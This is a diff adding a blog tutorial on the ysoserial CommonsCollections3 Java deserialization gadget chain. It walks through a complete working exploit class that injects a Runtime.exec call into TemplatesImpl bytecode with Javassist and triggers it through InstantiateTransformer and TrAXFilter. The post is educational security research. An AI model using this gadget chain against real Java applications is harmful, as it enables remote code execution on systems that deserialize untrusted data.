@@ -1,0 +1,261 @@
+---
+layout: default
+---
+<html>
+<body>
+<h1>CommonsCollection3</h1>
+
+The commonsCollection3 and CommonsCollection1 is exactly the same except instead of InvokerTransFormer we use instantiateTransformer and uses of TemplatesImpl and TraXFilter.class
+
+<b>Prerequisites: Java Assist</b>
+<p>
+    If you do not understand how javaAssist Works please go through https://www.javassist.org/tutorial/tutorial.html before reading further, as it's crucial to understand the payload.
+</p>
+
+So lets Understand how this instantiateTransformer works.
+Why we need TemplateImpl class and TraxFilter class.
+
+Checkout the bonus article to learn a little bit more into these and how can we modify the existing ysoserial code and use slightly different code to achieve Code Execution.
+
+<h3>instantiateTransformer</h3>
+The instantiateTransformer takes a class and instantiates it with the value(data) provided to it.
+
+InstantiateTransformer() constructor takes 2 parameters.
+- Parameter Type(a class array of types)
+- args(The Object type).
+
+<Working OF InstantiateTransFormer with Sample COde></Working>
+
+<p>Lets Understand the payload now</p>
+<p>
+    <pre>
+        <code>
+            public Object getObject(final String command) throws Exception {
+                Object templatesImpl = Gadgets.createTemplatesImpl(command);
+        
+                // inert chain for setup
+                final Transformer transformerChain = new ChainedTransformer(
+                    new Transformer[]{ new ConstantTransformer(1) });
+                // real chain for after setup
+                final Transformer[] transformers = new Transformer[] {
+                        new ConstantTransformer(TrAXFilter.class),
+                        new InstantiateTransformer(
+                                new Class[] { Templates.class },
+                                new Object[] { templatesImpl } )};
+        final Map innerMap = new HashMap();
+        
+                final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        
+                final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+        
+                final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
+        
+                Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
+        
+                return handler;
+        }
+        </code>
+    </pre>
+</p>
+
+<div>
+    <p>
+        On the above code we are Using the InstantiateTransFormer with Templates.class and passing the TemplatesImpl 
+        We are obtaining the templatesImpl from Gadgets.createTemplatesImpl(Command)
+
+        Instead of reviewing the Gadgets.class of ysoserial lets Review the code below, which basically the same but instead of Gadgets.class we are creating owr own class.
+    </p>
+</div>
+<div>
+    <p>
+        <pre>
+            <code>
+                import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import java.lang.reflect.Field;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import org.apache.commons.codec.binary.Base64;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+import javax.xml.transform.Templates;
+import javax.xml.transform.Transformer;
+import org.apache.commons.collections.functors.*;
+public class TemplatesImplExploit {
+    public static void main(String[] args) throws Exception {
+        String command="notepad.exe";
+        ClassPool pool = ClassPool.getDefault();
+
+        /*
+         * So inside the pool.get() we can pass any random existing className , we just have to keep in mind that we call
+         * clazz.makeClassInitializer().insertAfter(cmd); and  CtClass superC = pool.get(AbstractTranslet.class.getName());
+            clazz.setSuperclass(superC);
+
+            Reason for calling the above 2 are.
+            1.In TemplatesIMPL Class when we set the _byteCode to a bytecode of ourchoice, our bytecode must be extending the  
+            AbstractTranslet.class or else TemplatesIMPL will not execute it.
+         */
+
+
+        final CtClass clazz = pool.get(TemplatesImplExploit.class.getName()); // 1
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+            command.replace("\\", "\\\\").replace("\"", "\\\"") +
+            "\");";
+        clazz.makeClassInitializer().insertAfter(cmd);
+        CtClass superC = pool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superC);
+        final byte[] classBytes = clazz.toBytecode();
+
+
+
+        byte[] maliciousBytecode =classBytes;
+    
+
+        /*
+         * Till Line 58 we are creating an Object of TemplatesIMPL class and using reflection to set the _bytecode,_name and
+         * _tfactory , as these are necessary fields.
+         * 
+         */
+
+        TemplatesImpl templates = new TemplatesImpl(); // 2
+
+    
+        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates, new byte[][]{maliciousBytecode});
+
+       
+        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates, "Exploit");
+        
+        Field tfacname = TemplatesImpl.class.getDeclaredField("_tfactory");
+        tfacname.setAccessible(true);
+        tfacname.set(templates, TransformerFactoryImpl.class.newInstance());
+
+        //templates.newTransformer();
+
+
+        /*
+         * Below we are using the transformer chain.
+         * The reason why we are taking TemplatesIMPL , is becuase it takes a _bytecode and execute it.
+         * 
+         * 
+         * Why we use TrAxFilter.class
+         * If you see the line 65 there is templates.newTransfromer().This is exactly where our _bytecode gets executed.
+         * So while using the InstantiateTransformer, we have to find a subsequent class (Like Runtime.class in InvokerTransformer)
+         * that takes a entry of type Templates.class and calls the newTransformer() method
+         * 
+         * But why so.
+         * 
+         * If you see how exactly the InstantiateTransformer.transfrom() wroks , you will see the below code.
+         * 
+         *  
+         *  public T transform(final Class<? extends T> input) {
+            final Constructor<? extends T> con = input.getConstructor(iParamTypes);
+            return con.newInstance(iArgs);
+            }
+         * 
+         * So in the above code the transfrom() takes a class as input and calls the getConstructor(), which will return
+         * all the public constrcutors present in there , however it's also passing an argument in getConstructor of 
+         * iParamTypes which it gets from  the initilisation, so on the below code it will be Templates.class
+         * 
+         * So what it will do, it will look for the constructor that takes an argument of type Templates.class and where will it 
+         * look?
+         * 
+         * It will look into the TrAXFilter.class for us cause that is what we are passing in.
+         * If we pass any other class , then it should meet the above criteria so that we can use the InstantiateTransformer.
+         * 
+         * 
+         * Once we set the Transfromer we are simply calling the chainedTransfromer but in a simple way
+         */
+         
+        ConstantTransformer tr=new ConstantTransformer(1); // 3
+        ConstantTransformer tr1=new ConstantTransformer(TrAXFilter.class);
+        InstantiateTransformer tr2=new InstantiateTransformer(new Class[] { Templates.class },new Object[] { templates } );
+        tr2.transform(tr1.transform(tr.transform("test")));
+        
+    }
+}
+            </code>
+        </pre>
+    </p>
+</div>
+
+<div>
+    <p>
+        On the above code there 3 section.
+        At [1] we are using the JavaAssist to initialised the command and inserting it during the runtime .
+        <p>So inside the pool.get() we can pass any random existing className , we just have to keep in mind that we call clazz.makeClassInitializer().insertAfter(cmd); and  CtClass superC = pool.get(AbstractTranslet.class.getName()); and clazz.setSuperclass(superC);<br>
+   
+               Reason for calling the above 2 are.
+               1.In TemplatesIMPL Class when we set the _byteCode to a bytecode of ourchoice, our bytecode must be extending the  
+               AbstractTranslet.class or else TemplatesIMPL will not execute it.</p>
+
+        At [2] we are setting the _bytecode and the _tfactory and the name ,
+        <p>
+
+
+            Till Line 58 we are creating an Object of TemplatesIMPL class and using reflection to set the _bytecode,_name and
+            * _tfactory , as these are necessary fields.
+
+
+
+        </p>
+        The _bytecode is simply the bytecode of our class code that gets created during the runtime via javaAssist.
+        At [3] we are setting of the InstantiateTransFormer to execute the templates which is basically the TemplatesImpl class Object.
+        Now there are couple Questions that need to be answered here.
+        <ol>
+            <li>Why TemplatesImpl Class</li>
+            <p>The reason why we are taking TemplatesIMPL , is becuase it takes a _bytecode and execute it.</p>
+            <li>Why TraXFilter Class</li>
+            <p>If you see the line 65 there is templates.newTransfromer().This is exactly where our _bytecode gets executed.<br>
+                 So while using the InstantiateTransformer, we have to find a subsequent class (Like Runtime.class in InvokerTransformer) that takes a entry of type Templates.class and calls the newTransformer() method</p>
+                <i>But why?</i>
+                <p>If you see how exactly the InstantiateTransformer.transfrom() wroks , you will see the below code.<br>
+
+                    <pre>
+                    public T transform(final Class<? extends T> input) {
+                               final Constructor<? extends T> con = input.getConstructor(iParamTypes);
+                               return con.newInstance(iArgs);
+                               }
+                   </pre>
+                   So in the above code the transfrom() takes a class as input and calls the getConstructor(), which will return all the public constrcutors present in there , however it's also passing an argument
+                   <br>in getConstructor of  iParamTypes which it gets from  the initilisation, so on the below code it will be Templates.class<br><br>
+                   
+                   So what it will do, it will look for the constructor that takes an argument of type Templates.class and where will it 
+                   look?<br>
+                   It will look into the TrAXFilter.class for us cause that is what we are passing in.<br>
+                   If we pass any other class , then it should meet the above criteria so that we can use the InstantiateTransformer.<br>
+                   (Checkout how InstantiateTransformer Works on the post sections )<br><br>
+                   
+                   
+                   Once we set the Transfromer we are simply calling the chainedTransfromer but in a simple way just like in the CommonsCollection1.</p>
+                 <li>Why are we passing 1 into constant TransFormer</li>
+                 <p>We dont need, we can remove it and the exploit will still work.</p>
+        </ol>
+
+    </p>
+</div>
+<div>
+    <img src="images/cc/cc3calc.PNG">
+</div>
+<div>
+    <p>
+        This is how the CommonsCollection3 Works.
+    </p>
+    <p>We simply use the TemplateImpl class so that we can execute our own _byteCode and then then the instntiateTransformer so that we can instntiate the Templates.Class</p>
+    <p>Apart from the above changes everything else remains Same</p>
+</div>
+
+<p>Thats it for Today.</p>
+<p>Thanks For Reading.</p>
+<p>Happy Hacking.</p>
+<p>You can connect with me at:</p>
+<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
+<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+
+</body>
+</html>
